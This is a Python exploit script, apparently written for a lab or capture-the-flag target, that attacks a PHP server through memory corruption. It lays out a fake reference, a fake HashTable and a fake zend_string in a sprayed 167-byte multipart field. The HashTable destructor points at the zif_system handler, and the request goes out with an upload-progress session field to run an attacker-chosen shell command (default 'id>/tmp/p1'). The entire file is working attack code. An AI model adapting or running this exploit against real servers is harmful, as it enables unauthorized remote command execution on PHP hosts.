#!/usr/bin/env python3
"""Request B: fake reference -> fake HashTable in live 167-byte string ->
pDestructor = zif_system (libphp internal function handler).

The 167-byte carrier holds:
  HT at data+0x00 (0x38 bytes), arData = data+0x20, pDestructor = zif_system
  execute_data at E = data+0x20 (0x50 bytes)
    E+0x10 (HT pDestructor) = zif_system
    E+0x2C = num_args = 1
    E+0x50 = arg1 zval: value = data+0x80, type = IS_STRING
  fake zend_string at data+0x80: refcount=1, type=0x106, len=10, chars at 0x98
Only libphp base is needed (zif_system = libphp + 0x43a870); no libc.

usage: send_b_zif.py N1 N2 HTDATA ZIF [CMD]
"""
import socket, struct, sys
N1=int(sys.argv[1]); N2=int(sys.argv[2]); HT=int(sys.argv[3],0); ZIF=int(sys.argv[4],0)
CMD=(sys.argv[5] if len(sys.argv)>5 else 'id>/tmp/p1').encode()
BND=b'B'*10; HOST='127.0.0.1'; PORT=8088; SID=b'attacksessionid0001'
L1=167
ht=bytearray(b'\x00'*L1)
# fake HashTable
struct.pack_into('<II',ht,0x00,1,7)                 # gc: refcount=1, type=IS_ARRAY
struct.pack_into('<II',ht,0x08,0x10,0xfffffff8)     # flags=STATIC_KEYS, mask=-8
struct.pack_into('<Q',ht,0x10,HT+0x20)              # arData -> execute_data
struct.pack_into('<II',ht,0x18,1,1)                 # nNumUsed, nNumOfElements
struct.pack_into('<II',ht,0x20,8,0)                 # nTableSize, nInternalPointer
struct.pack_into('<Q',ht,0x28,0)                    # nNextFreeElement
struct.pack_into('<Q',ht,0x30,ZIF)                  # pDestructor = zif_system
# execute_data at E=0x20
E=0x20
struct.pack_into('<Q',ht,E+0x00,0)                  # opline
struct.pack_into('<Q',ht,E+0x08,0)                  # call
struct.pack_into('<Q',ht,E+0x10,ZIF)                # return_value (== HT pDestructor slot)
struct.pack_into('<Q',ht,E+0x18,0)                  # func (unused on success path)
struct.pack_into('<Q',ht,E+0x20,0)                  # This.value
struct.pack_into('<I',ht,E+0x28,0)                  # This.u1.type_info
struct.pack_into('<I',ht,E+0x2C,1)                  # ZEND_CALL_NUM_ARGS = 1
struct.pack_into('<Q',ht,E+0x30,0)                  # prev_execute_data
struct.pack_into('<Q',ht,E+0x38,0)                  # symbol_table
struct.pack_into('<I',ht,E+0x40,0)                  # call_info
# arg1 zval at E+0x50 = 0x70
struct.pack_into('<Q',ht,E+0x50,HT+0x80)            # value -> fake zend_string
struct.pack_into('<I',ht,E+0x58,6)                  # type = IS_STRING
# fake zend_string at 0x80
struct.pack_into('<II',ht,0x80,1,0x106)             # gc refcount=1, type=IS_STRING_EX
struct.pack_into('<Q',ht,0x88,0)                    # h
struct.pack_into('<Q',ht,0x90,len(CMD))             # len
ht[0x98:0x98+len(CMD)]=CMD
ht[0x98+len(CMD)]=0
# fake reference (55 bytes) at R0-0x10
ref=bytearray(b'X'*55)
struct.pack_into('<II',ref,0x10,1,10)               # gc refcount=1, type=IS_REFERENCE
struct.pack_into('<Q',ref,0x18,HT)                  # val.value = fake HT data
struct.pack_into('<Q',ref,0x20,0x307)               # val.type = IS_ARRAY_EX
struct.pack_into('<Q',ref,0x28,0)                   # sources
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N1):
    parts.append({'name':('a%030d'%i)[:31],'data':bytes(ht)})
for i in range(N2):
    parts.append({'name':('f%02d'%i),'data':bytes(ref)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
